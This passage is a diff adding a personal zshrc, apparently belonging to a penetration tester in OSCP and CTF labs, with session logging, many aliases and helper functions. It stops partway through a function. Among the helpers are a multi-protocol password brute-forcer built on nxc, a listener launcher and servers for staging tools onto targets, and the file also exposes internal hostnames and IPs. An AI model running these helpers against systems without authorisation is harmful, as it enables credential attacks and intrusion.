@@ -1,0 +1,1516 @@
+# /etc/zsh/zshrc: system-wide .zshrc file for zsh(1).
+#
+# This file is sourced only for interactive shells. It
+# should contain commands to set up aliases, functions,
+# options, key bindings, etc.
+#
+# Global Order: zshenv, zprofile, zshrc, zlogin
+
+# ──────────────────────────── ============ Auto-start terminal logging ============ ─────────────────────────────────
+# Automatic terminal session logging
+# This block ensures every NEW interactive shell is logged
+# exactly once using the `script` command — and the logs are
+# saved per-box in the relevant notes directory.
+# ──────────────────────────── ===================================================== ────────────────────────────────
+
+# Path to your CTF script's current working dir marker
+CURRENT_DIR_FILE="${HOME}/.current_workdir"
+
+# Only proceed if we're not already logging this shell
+# AND we can identify which box we're working on
+if [[ -z "${UNDER_SCRIPT}" && -f "$CURRENT_DIR_FILE" ]]; then
+
+    # Read the target working directory from the .current_workdir file
+    # This should contain something like: /home/kali/OSCP/HACK/Nickel-W-O-99
+    WORK_DIR=$(cat "$CURRENT_DIR_FILE")
+
+    # Extract just the folder name (e.g., Nickel-W-O-99) from the full path
+    BOXNAME=$(basename "$WORK_DIR")
+
+    # Use that box name to create a target directory in the notes repo
+    # Final path will be something like:
+    #   /home/kali/OSCP/CTFs/ctf_NOTES_obs/Nickel-W-O-99/
+    NOTES_DIR="${HOME}/OSCP/CTFs/ctf_NOTES_obs/${BOXNAME}"
+    mkdir -p "$NOTES_DIR"
+
+    # Build a unique filename for the log:
+    #   terminal-session-YYYY-MM-DD.HH-MM-SS.PID.log
+    #
+    # - Timestamp: lets you know exactly when the session started
+    # - PID: avoids collisions if multiple terminals are opened in the same second
+    NEW_LOG_FILE="${NOTES_DIR}/terminal-session-$(date +%F.%H-%M-%S).$$.log"
+
+    # Only re-log if the current UNDER_SCRIPT is unset,
+    # or if it doesn't match the log path for this box
+    if [[ "$UNDER_SCRIPT" != "$NEW_LOG_FILE" ]]; then
+
+        # Save this log path into the environment
+        export UNDER_SCRIPT="$NEW_LOG_FILE"
+
+        # Show a message for the user — where the session is being saved
+        echo "➤ Logging terminal session to: $NEW_LOG_FILE"
+
+        # Replace this shell with a script session, logging everything
+        #
+        # -f: flush output immediately (so logs stay in sync)
+        # -q: quiet mode (no "Script started..." banner)
+        exec script -f -q "$NEW_LOG_FILE"
+
+        # If exec fails (very rare), exit just in case
+        exit
+    fi
+fi
+# ──────────────────────────── ============ End terminal logging block ============= ────────────────────────────────
+# ──────────────────────────── ===================================================== ────────────────────────────────
+
+READNULLCMD=${PAGER:-/usr/bin/pager}
+
+# An array to note missing features to ease diagnosis in case of problems.
+typeset -ga debian_missing_features
+
+if [[ -z "${DEBIAN_PREVENT_KEYBOARD_CHANGES-}" ]] &&
+   [[ "$TERM" != 'emacs' ]]
+then
+
+    typeset -A key
+    key=(
+        BackSpace  "${terminfo[kbs]}"
+        Home       "${terminfo[khome]}"
+        End        "${terminfo[kend]}"
+        Insert     "${terminfo[kich1]}"
+        Delete     "${terminfo[kdch1]}"
+        Up         "${terminfo[kcuu1]}"
+        Down       "${terminfo[kcud1]}"
+        Left       "${terminfo[kcub1]}"
+        Right      "${terminfo[kcuf1]}"
+        PageUp     "${terminfo[kpp]}"
+        PageDown   "${terminfo[knp]}"
+    )
+
+    function bind2maps () {
+        local i sequence widget
+        local -a maps
+
+        while [[ "$1" != "--" ]]; do
+            maps+=( "$1" )
+            shift
+        done
+        shift
+
+        sequence="${key[$1]}"
+        widget="$2"
+
+        [[ -z "$sequence" ]] && return 1
+
+        for i in "${maps[@]}"; do
+            bindkey -M "$i" "$sequence" "$widget"
+        done
+    }
+
+    bind2maps emacs             -- BackSpace   backward-delete-char
+    bind2maps       viins       -- BackSpace   vi-backward-delete-char
+    bind2maps             vicmd -- BackSpace   vi-backward-char
+    bind2maps emacs             -- Home        beginning-of-line
+    bind2maps       viins vicmd -- Home        vi-beginning-of-line
+    bind2maps emacs             -- End         end-of-line
+    bind2maps       viins vicmd -- End         vi-end-of-line
+    bind2maps emacs viins       -- Insert      overwrite-mode
+    bind2maps             vicmd -- Insert      vi-insert
+    bind2maps emacs             -- Delete      delete-char
+    bind2maps       viins vicmd -- Delete      vi-delete-char
+    bind2maps emacs viins vicmd -- Up          up-line-or-history
+    bind2maps emacs viins vicmd -- Down        down-line-or-history
+    bind2maps emacs             -- Left        backward-char
+    bind2maps       viins vicmd -- Left        vi-backward-char
+    bind2maps emacs             -- Right       forward-char
+    bind2maps       viins vicmd -- Right       vi-forward-char
+
+    # Make sure the terminal is in application mode, when zle is
+    # active. Only then are the values from $terminfo valid.
+    if (( ${+terminfo[smkx]} )) && (( ${+terminfo[rmkx]} )); then
+        function zle-line-init () {
+            emulate -L zsh
+            printf '%s' ${terminfo[smkx]}
+        }
+        function zle-line-finish () {
+            emulate -L zsh
+            printf '%s' ${terminfo[rmkx]}
+        }
+        zle -N zle-line-init
+        zle -N zle-line-finish
+    else
+        for i in {s,r}mkx; do
+            (( ${+terminfo[$i]} )) || debian_missing_features+=($i)
+        done
+        unset i
+    fi
+
+    unfunction bind2maps
+
+fi # [[ -z "$DEBIAN_PREVENT_KEYBOARD_CHANGES" ]] && [[ "$TERM" != 'emacs' ]]
+
+zstyle ':completion:*:sudo:*' command-path /usr/local/sbin \
+                                           /usr/local/bin  \
+                                           /usr/sbin       \
+                                           /usr/bin        \
+                                           /sbin           \
+                                           /bin            \
+                                           /usr/X11R6/bin
+
+(( ${+aliases[run-help]} )) && unalias run-help
+autoload -Uz run-help
+
+# If you don't want compinit called here, place the line
+# skip_global_compinit=1
+# in your $ZDOTDIR/.zshenv
+if (( ${${(@f)"$(</etc/os-release)"}[(I)ID*=*ubuntu]} )) &&
+   [[ -z "$skip_global_compinit" ]]; then
+  autoload -U compinit
+  compinit
+fi
+
+
+
+
+
+
+# --------------------------------------------------
+# 🛠️ Environment Variables
+# --------------------------------------------------
+
+export CLICOLOR=1
+export LSCOLORS=GxFxCxDxBxegedabagaced
+# export PS1="%F{green}%~%f%F{red}$(parse_git_branch)%f $ "
+export BASH_SILENCE_DEPRECATION_WARNING=1  # this line silences the message you get when you start a new terminal
+export ANDROID_HOME="/Users/clive/Library/Android/sdk"
+export GOPATH=$HOME/go
+export PATH=$PATH:$GOPATH/bin
+export PATH=$PATH:/Users/clive/Tools
+export NVM_DIR="$HOME/.nvm"
+export PATH=/Library/TeX/texbin:$PATH
+export PATH="$PATH:$HOME/Tools"
+export PATH=$PATH:/snap/bin
+
+
+# --------------------------------------------------
+# ⚡ Aliases
+# --------------------------------------------------
+
+alias ll='ls -alF'
+alias la='ls -A'
+alias l='ls -CF'
+alias tcpdump='sudo tcpdump'
+alias pub="cat .ssh/id_rsa.pub"
+alias watch="watch -n 2"
+alias fuff="/Users/personalJesus/go/bin/ffuf"
+alias opentunnel="ssh -f -N -M -S /tmp/sshtunnel -D 1080 clive@xfeht-scanner.fire.corp.com -p22"
+alias closetunnel="ssh -S /tmp/sshtunnel -O exit xfeht-scanner.fire.corp.com -p22"
+alias tcplisten='sudo tcpdump "icmp"'
+alias myip="dig -4 TXT +short o-o.myaddr.l.google.com @ns1.google.com"
+alias pyServer="python -m http.server 9999"
+alias localscan='nmap -A -p- 127.0.0.1'
+alias hgg='history | grep'
+alias portscan="nmap -n -T4 -vvv -p-"
+alias gc='groovyConsole'
+alias ping='ping -c 4'
+alias cl='clear'
+alias cll='clear; ll'
+alias count='find . -type f | wc -l'
+alias k='kubectl'
+alias p='pwd'
+alias l='ls'
+alias ll='ls -la'
+alias lh='ls -lh'
+alias lt='du -sh * | sort -h'
+alias loc='locate'
+alias mnt='mount | grep -E ^/dev | column -t'
+alias mk='mkdir'
+alias gr='grep'
+alias prof='vi /Users/personalJesus/.bash_profile'
+alias h='history | tail -n 70'
+alias v='vim'
+alias rm='rm -i'
+alias trs='trash'
+alias cx='chmod +x'
+alias env='env | sort'
+alias kcv="kubectl config view"
+alias kinfo="k cluster-info"
+alias kgc="kubectl get cronjobs"
+alias kgd="kubectl get deployments"
+alias kgp="kubectl get pods -o wide"
+alias kcd="kubectl get crd"
+alias kgr="kubectl get replicasets"
+alias kgs="kubectl get statefulsets"
+alias kcf="kubectl create -f"
+alias kdashinit="kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.0/aio/deploy/recommended.yaml"
+alias pyServe="python -m http.server 9999"
+alias deldigocean="doctl compute droplet list --format "Name" | tail -n +2 | xargs -I {} doctl compute droplet delete {} -f"
+alias sharkw="open -a Wireshark"
+alias s385="shasum -a 384"
+alias droplet="/Users/clive/Tools/Scripts/dropletCreator.sh"
+alias jumpip='ping -c 1 9.20.192.108 | grep "bytes from" | cut -d" " -f 4 | cut -d":" -f1'
+alias toboxdir="cd /Users/clive/Library/CloudStorage/Box-Box/1_MY_BOX_NOTES"
+alias cleanup="sudo bash /Users/clive/Tools/Scripts/MacCleaner.sh"
+alias hashCheck="sudo bash /Users/clive/Tools/Scripts/hashChecker.sh"
+alias closeApps="python3 /Users/clive/Tools/Scripts/FindAndCloseRunningApplications.py"
+alias zap='/Applications/OWASP\ ZAP.app/Contents/Java/zap.sh'
+alias juiceshop3000='docker run --rm -p 3000:3000 bkimminich/juice-shop'
+alias dvwa80='docker run --rm -it -p 80:80 vulnerables/web-dvwa'
+alias pythUpdate="pip list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1  | xargs -n1 pip install -U"
+alias OTH="open -a Terminal ."
+alias WORK="/bin/bash /Users/clive/mystuff/MITMPROXY_Play/AUTOMATE.sh"
+alias ref="source /etc/zsh/zshrc" 
+alias hack-stack='ssh root@9.20.192.108'
+alias cwe="open /Users/clive/Tools/CWE/"
+alias xpdf-to-text='python3 /Users/clive/Tools/scripts/PDF-to-Text.py'
+alias t2w='python3 /Users/clive/Tools/Scripts/text-to-wisdom.py'
+alias podcast-audio="cd '/Users/clive/Library/Group Containers/243LU875E5.groups.com.apple.podcasts/Library/Cache/' && ll"
+alias corpusSplitter='python3 /Users/clive/Tools/Scripts/CorpusSplitter.py'
+alias testssh='/Users/clive/Tools/testssl.sh/testssl.sh'
+alias EOT-zip-up-and-hash="/Users/clive/Tools/Scripts/ZipUp-hash-and-store-PW.sh"
+alias droplet-new="sudo bash /Users/clive/mystuff/RemoteListenerDigOc/Create-a-New-Droplet.sh"
+alias class-dump="/Volumes/class-dump-3.5/class-dump"
+alias nmap-scripts-list='nmap --script-help=all | grep '\''^[a-zA-Z0-9-]*$'\'' | grep -v '\''^$'\'
+alias whereareTheAlias="echo /etc/profile.d/aliases.sh"
+alias hello="cd /home/kali/OSCP/HACK && sudo apt-get update -y"
+alias cl="clear"
+alias OSCP="sudo openvpn /home/kali/universal.ovpn"
+alias HTB="sudo openvpn /home/kali/machines_eu-dedivip-2.ovpn"
+alias EXAM-vpn="sudo openvpn /home/kali/OSCP/EXAM/VPN/get_to_the_chopper.ovpn"
+alias msfq="sudo msfconsole -q"
+alias bloodhound-ce="sudo docker-compose -f /opt/BloodHound/examples/docker-compose/docker-compose.yml up"
+alias snippets="firefox https://github.com/clive/OSCP-COURSE-Notes/blob/main/OSCP-Obsidian-Vault/HackingSnippets-2024.md"
+alias py-venv='sudo bash /home/kali/OSCP/OSCP-COURSE-Notes/py-venv.sh'
+alias spt='searchsploit'
+# alias linwinpwn='/home/kali/Tools/linWinPwn/linWinPwn.sh'
+alias wxp='bash /home/kali/OSCP/CTFs/utils/WindowsExploitSuggesterScript.sh'
+alias vmshare-on='sudo mkdir -p /mnt/hgfs && sudo mount -t fuse.vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other'
+alias vmshare-off='sudo umount /mnt/hgfs'
+alias open='open 2>/dev/null'
+alias lwp-docker='docker run --rm -it --net=host linwinpwn:latest'
+alias scode='sudo -E code --no-sandbox --user-data-dir="$HOME/.vscode-root"'   # opens vscode as root 
+# alias spd='echo "$PWD" > ~/.project_dir && export PROJECT_DIR="$PWD" && echo "PROJECT_DIR set to $PROJECT_DIR"'
+# alias gpd='cd "$(cat ~/.project_dir)" && export PROJECT_DIR="$(cat ~/.project_dir)"'
+
+alias winshare-on='sudo mount -t cifs //192.168.127.155/DEBUG /mnt/winshare -o username=Tester,vers=3.0'
+alias winshare-off='sudo umount /mnt/winshare'
+
+alias rmg='java -jar /home/kali/Tools/ImmidiateTools/rmg-5.1.0-jar-with-dependencies.jar'   # Tool for common java JMI vulns
+alias sanitize_this_git_repo_history="/home/kali/OSCP/CTFs/utils/git_sanitize_history.sh"
+alias tmuxbox='tmux new-session "unset UNDER_SCRIPT; exec zsh"'   # Runs a tmux session so the commands can be logged
+
+
+# --------------------------------------------------
+# 🔁 Functions
+# --------------------------------------------------
+
+
+# Sysreptor helper functions
+SYSREPTOR_DEPLOY_DIR="${SYSREPTOR_DEPLOY_DIR:-$HOME/Tools/install_sysreptor/sysreptor/deploy}"
+
+# Fucntion to start a sysreptor Pentesing reporting software on a docker container
+sysreptor_start() {
+  local deploy="$SYSREPTOR_DEPLOY_DIR"
+
+  if ! command -v docker >/dev/null 2>&1; then
+    echo "[sysreptor] Docker is not installed or not in PATH."
+    return 1
+  fi
+
+  if [ ! -d "$deploy" ]; then
+    echo "[sysreptor] Deploy directory not found: $deploy"
+    return 1
+  fi
+
+  echo "[sysreptor] Starting Sysreptor stack from: $deploy"
+  (
+    cd "$deploy" || exit 1
+
+    # Prefer docker compose (v2), fall back to docker-compose (v1)
+    if docker compose up -d >/dev/null 2>&1; then
+      :
+    elif command -v docker-compose >/dev/null 2>&1; then
+      docker-compose up -d
+    else
+      echo "[sysreptor] Neither 'docker compose' nor 'docker-compose' available."
+      exit 1
+    fi
+
+    echo "[sysreptor] Containers:"
+    docker compose ps 2>/dev/null || docker-compose ps 2>/dev/null || true
+  ) || {
+    echo "[sysreptor] Failed to start Sysreptor."
+    return 1
+  }
+
+  echo "[sysreptor] UI should be available on: http://127.0.0.1:8000/"
+}
+
+sysreptor_stop() {
+  local deploy="$SYSREPTOR_DEPLOY_DIR"
+
+  if ! command -v docker >/dev/null 2>&1; then
+    echo "[sysreptor] Docker not available; nothing to stop."
+    return 0
+  fi
+
+  if [ ! -d "$deploy" ]; then
+    echo "[sysreptor] Deploy directory not found: $deploy (skipping Sysreptor stop)."
+    return 0
+  fi
+
+  echo "[sysreptor] Stopping Sysreptor stack..."
+  (
+    cd "$deploy" || exit 0
+
+    # Only try to stop if something is actually running for this project
+    if docker compose ps -q 2>/dev/null | grep -q .; then
+      docker compose down >/dev/null 2>&1 || \
+      (command -v docker-compose >/dev/null 2>&1 && docker-compose down >/dev/null 2>&1)
+      echo "[sysreptor] Stack stopped."
+    elif command -v docker-compose >/dev/null 2>&1 && docker-compose ps -q 2>/dev/null | grep -q .; then
+      docker-compose down >/dev/null 2>&1
+      echo "[sysreptor] Stack stopped."
+    else
+      echo "[sysreptor] No running Sysreptor containers for this project."
+    fi
+  )
+}
+
+
+
+retro() {
+    # retrospective search for instances in my CTF notes of the term : eg SeImpersonate
+  {
+    # Markdown files whose filename contains ANY IP-like pattern (strict OR malformed)
+    find '/home/kali/OSCP/CTFs/ctf_NOTES_obs' \
+      -type f -regextype posix-extended \
+      -regex '.*[0-9]+(\.[0-9]+){1,3}.*\.md' \
+      -print0
+
+    # Markdown files in TestingMethodologies
+    find '/home/kali/Tools/TestingMethodologies' \
+      -type f -iname '*.md' \
+      -print0
+  } | xargs -0 rg -i -n -C2 --color=always \
+        --colors 'match:fg:red' \
+        --colors 'match:bg:yellow' \
+        --colors 'match:style:bold' \
+        --colors 'line:fg:blue' \
+        --colors 'path:bg:white' \
+        --colors 'path:fg:blue' \
+        --colors 'path:style:bold' \
+        "$@"
+}
+
+
+
+# cdp() {
+#   # change directory to the current project directory
+#   # is set in the script Start-Session.sh run by the function newbox
+#   # can also be set wit hthe fucntion below "cds"
+#   local file="$HOME/.current_workdir"
+
+#     case "$1" in
+#         -s|--show)
+#             if [ -f "$file" ]; then
+#                 cat "$file"
+#             else
+#                 echo "No saved project directory yet."
+#             fi
+#             ;;
+#         notes)
+#             if [ -f "$file" ]; then
+#                 local base=$(cat "$file")
+#                 local notes="${base/\/HACK\//\/CTFs\/ctf_NOTES_obs/}"
+#                 if [ -d "$notes" ]; then
+#                     cd "$notes" || return
+#                 else
+#                     echo "Notes dir not found: $notes"
+#                 fi
+#             else
+#                 echo "No saved project directory yet."
+#             fi
+#             ;;
+#         *)
+#             if [ -f "$file" ]; then
+#                 cd "$(cat "$file")" || return
+#             else
+#                 echo "No saved project directory yet."
+#             fi
+#             ;;
+#     esac
+# }
+
+
+# cds() {
+#     # Sets the current project directory
+#     local file="$HOME/.current_workdir"
+
+#     # If user gave an argument, use that as the dir, else use PWD
+#     local target="${1:-$PWD}"
+
+#     if [ -d "$target" ]; then
+#         echo "$target" > "$file"
+#         echo "✅ Saved project directory: $target"
+#     else
+#         echo "❌ Not a valid directory: $target"
+#         return 1
+#     fi
+# }
+
+# Get wisdoms from super notes - OSCP
+wiz() { grep -in "$1" /home/kali/OSCP/CTFs/ctf_NOTES_obs/SUPERNOTES/Succint\ extracts.md; }
+
+xs() {
+    # Search for terems in snipets file , Uses the rg tool
+    # Require at least one argument
+    if [ $# -eq 0 ]; then
+        echo "Error: Please provide a search term."
+        return 1
+    fi
+
+    SNIPPETS_FILE="/home/kali/OSCP/CTFs/utils/HackingSnippets-2025.md"
+
+    # Ensure the file exists
+    if [ ! -f "$SNIPPETS_FILE" ]; then
+        echo "Error: Snippets file not found at $SNIPPETS_FILE"
+        return 1
+    fi
+
+    # Search with ripgrep
+    rg -i -n -C2 --no-filename --color=always \
+       --colors 'match:bg:yellow' \
+       --colors 'match:fg:red' \
+       --colors 'line:style:bold' \
+       "$@" "$SNIPPETS_FILE"
+
+    # If no match, rg exits 1 → show custom message
+    if [ $? -ne 0 ]; then
+        echo "No results found for: $*"
+    fi
+}
+
+
+
+xxs() {
+    # deeper search than the above
+    # Check if an argument is provided
+    if [ -z "$1" ]; then
+        echo "Error: Please provide a search term."
+        return 1
+    fi
+
+    # Define the directory to search in
+    SEARCH_DIR="/home/kali/OSCP/OSCP-COURSE-Notes/OSCP-Obsidian-Vault"
+    
+    # Check if the directory exists
+    if [ ! -d "$SEARCH_DIR" ]; then
+        echo "Error: Directory not found at $SEARCH_DIR"
+        return 1
+    fi
+
+    # Search all Markdown files for the search term with grep
+    find "$SEARCH_DIR" -type f -name "*.md" -exec grep --color=always -i "$1" {} +
+
+    # Check if grep found any matches
+    if [ $? -ne 0 ]; then
+        echo "No results found for '$1'"
+    fi
+}
+
+srv() {
+    # Default port
+    local port=${1:-8000}                   # 1 (first arg, 8000 default)
+
+    # Launch the server
+    ifconfig tun0 | grep inet
+    echo "Starting HTTP server on port $port"
+    python3 -m http.server "$port"
+}
+
+lst() {
+    # Set the default path to penelope.py
+    local script_path="/home/kali/OSCP/CTFs/utils/penelope.py"
+    
+    # Check if the script exists
+    if [[ ! -f "$script_path" ]]; then
+        echo "Error: penelope.py not found at $script_path"
+        return 1
+    fi
+
+    # Get the port from the first argument or use default behavior
+    local port="${1:-}"
+
+    # Run the script with or without a port
+    if [[ -n "$port" ]]; then
+        echo "Running penelope.py on port $port..."
+        python3 "$script_path" "$port"
+    else
+        echo "Running penelope.py with default settings..."
+        python3 "$script_path"
+    fi
+}
+
+sharesmb() {
+    # launches an impacketSMB share from the local dir
+    local share_name="share"
+    local current_dir=$(pwd)
+    local tun_ip=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
+
+    if [ -z "$tun_ip" ]; then
+        echo "❌ Could not find tun0 IP. Is tun0 up?"
+        return 1
+    fi
+
+    echo "📂 Sharing: $current_dir"
+    echo "📡 From: $tun_ip"
+    echo "🪟 Windows access path: \\\\$tun_ip\\$share_name"
+    echo "🚀 Starting impacket-smbserver with SMB2 support..."
+
+    impacket-smbserver $share_name "$current_dir" -smb2support
+}
+
+
+
+# Add to passwords function
+atp() {
+    if [ "$#" -eq 0 ]; then
+        echo "Please provide at least one password."
+        return 1
+    fi
+
+    for password in "$@"; do
+        echo "$password" >> "$(pwd)/passwords.txt"
+    done
+}
+
+# atu() {
+#     if [ "$#" -eq 0 ]; then
+#         echo "Please provide at least one username."
+#         return 1
+#     fi
+
+#     for user in "$@"; do
+#         echo "$user" >> "$(pwd)/users.txt"
+#         echo "$user" >> "$(pwd)/passwords.txt"
+#     done
+# }
+
+atu() {
+    if [ "$#" -eq 0 ]; then
+        echo "Please provide at least one username."
+        return 1
+    fi
+
+    usersfile="${PWD}/users.txt"
+    passfile="${PWD}/passwords.txt"
+
+    # Ensure files exist but do NOT truncate them
+    touch "$usersfile" "$passfile"
+
+    for user in "$@"; do
+        lc="$(printf '%s' "$user" | tr '[:upper:]' '[:lower:]')"
+        uc="$(printf '%s' "$user" | tr '[:lower:]' '[:upper:]')"
+
+        for v in "$user" "$lc" "$uc"; do
+            # Append to users file if not already present
+            if ! grep -Fxq -- "$v" "$usersfile"; then
+                printf '%s\n' "$v" >> "$usersfile"
+            fi
+            # Append to passwords file if not already present
+            if ! grep -Fxq -- "$v" "$passfile"; then
+                printf '%s\n' "$v" >> "$passfile"
+            fi
+        done
+    done
+}
+
+
+
+
+atc() {
+    # Check if any arguments are provided
+    if [ "$#" -eq 0 ]; then
+        echo "Please provide at least one context word."
+        return 1
+    fi
+
+    # Define the context file path relative to current directory
+    CONTEXT_FILE="./ContextWordlist.txt"
+
+    # Ensure the context file exists
+    if [ ! -f "$CONTEXT_FILE" ]; then
+        touch "$CONTEXT_FILE"
+    fi
+
+    # Loop through all the arguments (context words)
+    for word in "$@"; do
+        # Append each word to the ContextWordlist.txt file in PWD
+        echo "$word" >> "$CONTEXT_FILE"
+        # Also append each word to the local passwords.txt (in PWD)
+        echo "$word" >> ./passwords.txt
+    done
+
+    echo "Updated: $(realpath "$CONTEXT_FILE")"
+}
+
+# Show passwords function
+stp() {
+    # Check if the file exists
+    if [ ! -f /home/kali/passwords.txt ]; then
+        echo "No passwords file found at /home/kali/passwords.txt"
+        return 1
+    fi
+
+    # Display the contents of the passwords.txt file
+    cat /home/kali/passwords.txt
+}
+
+cttx_wordlist() {
+    # Create or updates a contextual wordlist to be used for fuzzing. min 4 chars 
+    local wordlist="ContextWordlist.txt" 
+    local temp_wordlist="temp_wordlist.txt"
+ 
+    # Extract new words from files 
+    find . -type f -print0 | xargs -0 cat 2>/dev/null | tr -cs '[:alpha:]' '\n' | awk 'length > 3' | sort -u > "$temp_wordlist"
+ 
+    # Merge with existing list if it exists
+    if [[ -f "$wordlist" ]]; then
+        cat "$wordlist" "$temp_wordlist" | sort -u > "$wordlist" 
+        rm -f "$temp_wordlist" 
+    else 
+        mv "$temp_wordlist" "$wordlist"
+    fi 
+ 
+    echo "Wordlist updated at: $(realpath "$wordlist")"
+ 
+} 
+
+f2fz() {
+    # f2fz - File-to-Fuzz list . Take a file of txt and create a unique fuzz list
+    # Check if a file is provided
+    if [[ $# -ne 1 ]]; then
+        echo "Usage: f2fz <input_file>"
+        return 1
+    fi
+
+    local input_file="$1"
+
+    # Check if file exists
+    if [[ ! -f "$input_file" ]]; then
+        echo "Error: File '$input_file' not found."
+        return 1
+    fi
+
+    # Define output filename
+    local output_file="${input_file%.*}-FOR-Fuzzing.txt"
+
+    # Extract words, filter unique ones, and save to output file
+    tr -cs '[:alpha:]' '\n' < "$input_file" | awk 'length > 3' | sort -u > "$output_file"
+
+    echo "Wordlist generated at: $(realpath "$output_file")"
+}
+
+
+# Function to create a directory with the IP, move into it, and run the recon alias
+box_Recon() {
+  if [ -z "$1" ]; then
+    echo "Usage: setup_box <IP_ADDRESS>"
+    return 1
+  fi
+
+  IP_ADDRESS=$1
+  
+  # Create a directory with the IP followed by '-box'
+  DIR_NAME="${IP_ADDRESS}-box"
+  mkdir -p "$DIR_NAME"
+  
+  # Move into the directory
+  cd "$DIR_NAME" || { echo "Failed to move into directory $DIR_NAME"; return 1; }
+
+  # Run the Recon-Start.sh script, passing the IP and saving output to ReconInitial.txt
+  /bin/bash /home/kali/OSCP/CTFs/utils/Recon-Start.sh "$IP_ADDRESS" | tee -a ReconInitial.txt
+}
+
+
+# Function to create or add to a Contextual fuzz list
+ctnxfz() {
+    # Check if a URL is provided
+    if [ -z "$1" ]; then
+        echo "Usage: ctnxfz <url>"
+        return 1
+    fi
+
+    # Define the target file
+    local fuzz_list="ContextualFuzzList.txt"
+    local temp_file="TempFile"
+
+    # Run cewl and append results to the fuzz list
+    echo "[*] Running cewl on $1 and updating the fuzz list..."
+    cewl "$1" -m 5 >> "$fuzz_list"
+
+    # Remove duplicates
+    echo "[*] Removing duplicates from the fuzz list..."
+    awk '!seen[$0]++' "$fuzz_list" > "$temp_file" && mv "$temp_file" "$fuzz_list"
+
+    echo "[*] Updated fuzz list saved to $fuzz_list."
+}
+
+
+mov-to-mp4() {
+    if [[ -z "$1" ]]; then
+        echo "Usage: convert_mov_to_mp4 <input_file.mov>"
+        return 1
+    fi
+    local input_file="$1"
+    local output_file="${input_file%.mov}.mp4"
+    ffmpeg -i "$input_file" -c:v libx264 -crf 23 -c:a aac -b:a 192k "$output_file"
+    echo "Converted file saved as $output_file"
+}
+
+
+CVEdata() {
+  local CVE_ID=$1
+
+  if [ -z "$CVE_ID" ]; then
+    echo "Usage: CVEdata <CVE-ID>"
+    return 1
+  fi
+
+  curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=$CVE_ID" | jq '
+  {
+    "CVE ID": .vulnerabilities[0].cve.id,
+    "Score": .vulnerabilities[0].cve.metrics.cvssMetricV31[0].cvssData.baseScore,
+    "Severity": .vulnerabilities[0].cve.metrics.cvssMetricV31[0].cvssData.baseSeverity,
+    "Description": .vulnerabilities[0].cve.descriptions[] | select(.lang == "en") | .value,
+    "References": (.vulnerabilities[0].cve.references | map(.url))
+  }'
+}
+
+dfc () {
+   echo "Stopping all docker containers ... "
+   docker stop $(docker ps -a -q)
+   echo "Removeing all excited containers ..."
+   docker rm $(docker ps -a -f status=exited -q)	     # remove all excited containers
+   echo "Removeing all images ..."
+   docker rmi $(docker images -a -q)		     # remove all images
+}
+
+
+delete_all_droplets() {
+    echo "Do you really want to delete ALL droplets? (y/n)"
+    read -r response
+
+    if [[ "$response" == "y" ]]; then
+        echo "Deleting all droplets..."
+
+        # Get the list of all droplet IDs
+        droplet_ids=$(doctl compute droplet list --no-header --format ID)
+
+        # Loop through each droplet ID and delete it
+        for id in $droplet_ids; do
+            doctl compute droplet delete "$id" --force
+            echo "Deleted droplet with ID: $id"
+        done
+
+        echo "All droplets have been deleted."
+    else
+        echo "Operation cancelled."
+    fi
+}
+
+fzl_pyld() {
+	    find -L /usr/share/wordlists -type f 2>/dev/null | xargs grep -Hi --color=always "$1" 2>/dev/null
+}
+
+fzl_files() {
+    find -L /usr/share/wordlists -type f 2>/dev/null | xargs grep -l "$1" 2>/dev/null
+}
+
+brutedirty() {
+    local target userinput passinput useropt passopt
+    target="$1"
+    userinput="$2"
+    passinput="$3"
+
+    if [[ -z "$target" || -z "$userinput" || -z "$passinput" ]]; then
+        echo "Usage: brutedirty <ip> <username OR userfile> <password OR passfile>"
+        return 1
+    fi
+
+    # Use -u for both single username OR file
+    if [[ -f "$userinput" ]]; then
+        useropt=(-u "$userinput")
+        echo "[*] Detected user file with $(wc -l < "$userinput") entries."
+    else
+        useropt=(-u "$userinput")
+        echo "[*] Using single username: $userinput"
+    fi
+
+    # Use -p for both single password OR file
+    if [[ -f "$passinput" ]]; then
+        passopt=(-p "$passinput")
+        echo "[*] Detected password file with $(wc -l < "$passinput") entries."
+    else
+        passopt=(-p "$passinput")
+        echo "[*] Using single password: $passinput"
+    fi
+
+    local protocols=(ssh ftp smb ldap rdp winrm wmi mssql vnc nfs)
+    echo -e "\n[*] Brute-forcing $target..."
+
+    for proto in "${protocols[@]}"; do
+        echo -e "\n[*] ------ Testing protocol: $proto ------"
+        nxc "$proto" "$target" "${useropt[@]}" "${passopt[@]}" --continue-on-success
+    done
+}
+
+tools_upgrade() {
+  echo
+  echo "[*] Updating package lists..."
+  sudo apt update
+  echo
+  echo "[*] Upgrading key tools..."
+  sudo apt install --only-upgrade -y code obsidian nmap burpsuite firefox-esr
+  echo
+  echo "[+] Upgrade complete."
+}
+
+
+
+linwinupdate() {
+    cd ~/Tools/linWinPwn
+    git pull
+    sudo ./install.sh
+    echo "[+] linWinPwn updated."
+}
+
+
+
+gitupdatetools() {
+    local base="$HOME/Tools"
+    local orig_pwd="$PWD"
+    echo "[*] Checking all Git repos in $base..."
+
+    for dir in "$base"/*; do
+        if [[ -d "$dir/.git" ]]; then
+            echo -e "\n🔍 Repo: $(basename "$dir")"
+            ( # start subshell
+                cd "$dir" || exit
+                local current=$(git rev-parse --short HEAD)
+                git fetch --quiet
+                local remote=$(git rev-parse --short @{u} 2>/dev/null)
+
+                echo "   Current: $current"
+                echo "   Remote : $remote"
+
+                if [[ "$current" != "$remote" ]]; then
+                    echo "   ⏫ Updating..."
+                    git pull --quiet && echo "   ✅ Updated to $remote"
+                else
+                    echo "   ✅ Already up to date."
+                fi
+            )
+        fi
+    done
+
+    cd "$orig_pwd"
+}
+
+immtools() {
+  # Serve immidiate Tools from a specific directory using Python's HTTP server
+  local PORT=80
+  local DIR="/home/kali/Tools/ImmidiateTools"
+  cd "$DIR" || { echo "[-] Failed to enter $DIR"; return 1; }
+
+  # Get IP from tun0 interface
+  local IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
+  if [ -z "$IP" ]; then
+    echo "[!] Could not find IP on tun0. Is your VPN up?"
+    return 1
+  fi
+
+  echo "[*] Serving files from: $DIR"
+  echo
+  ls -la
+  echo
+  echo "[*] Hosting on IP: $IP:$PORT"
